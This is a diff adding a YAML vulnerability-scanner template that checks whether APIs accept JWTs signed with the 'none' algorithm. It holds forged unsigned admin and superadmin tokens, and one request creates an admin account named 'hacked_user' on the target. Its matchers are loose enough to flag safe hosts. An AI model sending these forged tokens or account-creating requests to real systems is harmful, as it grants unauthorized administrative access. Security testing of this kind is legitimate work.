@@ -1,0 +1,112 @@
+id: medium-api-json-web-signature-bypass-none
+
+info:
+  name: JWS None Algorithm Bypass
+  author: redteam-elite
+  severity: medium
+  description: |
+    Detects JWT implementations that accept the "none" algorithm, allowing attackers
+    to bypass signature verification by setting the algorithm to "none" and removing
+    the signature portion of the JWT token.
+  reference:
+    - https://tools.ietf.org/html/rfc7515#section-3.1
+    - https://portswigger.net/web-security/jwt/algorithm-confusion
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 8.2
+    cwe-id: CWE-347
+  tags: jwt,jws,none,algorithm,bypass,authentication,api,medium
+
+http:
+  - raw:
+      - |
+        POST /api/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"username":"user","password":"password"}
+
+      - |
+        GET /api/user/profile HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{none_jwt_user}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+      - |
+        GET /api/admin/users HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{none_jwt_admin}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+      - |
+        GET /api/admin/settings HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{none_jwt_superadmin}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+      - |
+        POST /api/admin/users HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{none_jwt_admin}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"username":"hacked_user","role":"admin","permissions":["read","write","delete"]}
+
+    variables:
+      # JWT with "none" algorithm - regular user
+      none_jwt_user: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwibmFtZSI6InVzZXIiLCJpYXQiOjE2MTYyMzkwMjIsInJvbGUiOiJ1c2VyIn0."
+      # JWT with "none" algorithm - admin privileges
+      none_jwt_admin: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNjE2MjM5MDIyLCJyb2xlIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0."
+      # JWT with "none" algorithm - superadmin privileges  
+      none_jwt_superadmin: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwibmFtZSI6InN1cGVyYWRtaW4iLCJpYXQiOjE2MTYyMzkwMjIsInJvbGUiOiJzdXBlcmFkbWluIiwiYWRtaW4iOnRydWUsInN1cGVyX2FkbWluIjp0cnVlfQ."
+
+    extractors:
+      - type: regex
+        name: original_jwt
+        group: 1
+        regex:
+          - '"token":\s*"([^"]+)"'
+          - '"access_token":\s*"([^"]+)"'
+        internal: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: regex
+        part: body
+        regex:
+          - '"id":\s*\d+'
+          - '"username":\s*"[^"]+"'
+          - '"role":\s*"admin"'
+          - '"role":\s*"superadmin"'
+          - '"admin":\s*true'
+          - '"super_admin":\s*true'
+          - '"users":\s*\['
+          - '"settings":\s*\{'
+          - '"username":\s*"hacked_user"'
+        condition: or
+
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - '"error":\s*"invalid.*token"'
+          - '"error":\s*"algorithm.*not.*allowed"'
+          - '"error":\s*"none.*algorithm.*disabled"'
+          - 'signature.*required'
+          - 'algorithm.*none.*rejected'
+
+      - type: word
+        part: header
+        negative: true
+        words:
+          - "X-JWT-None-Disabled: true"
+          - "X-Algorithm-Whitelist: HS256,RS256"
+
+    stop-at-first-match: true
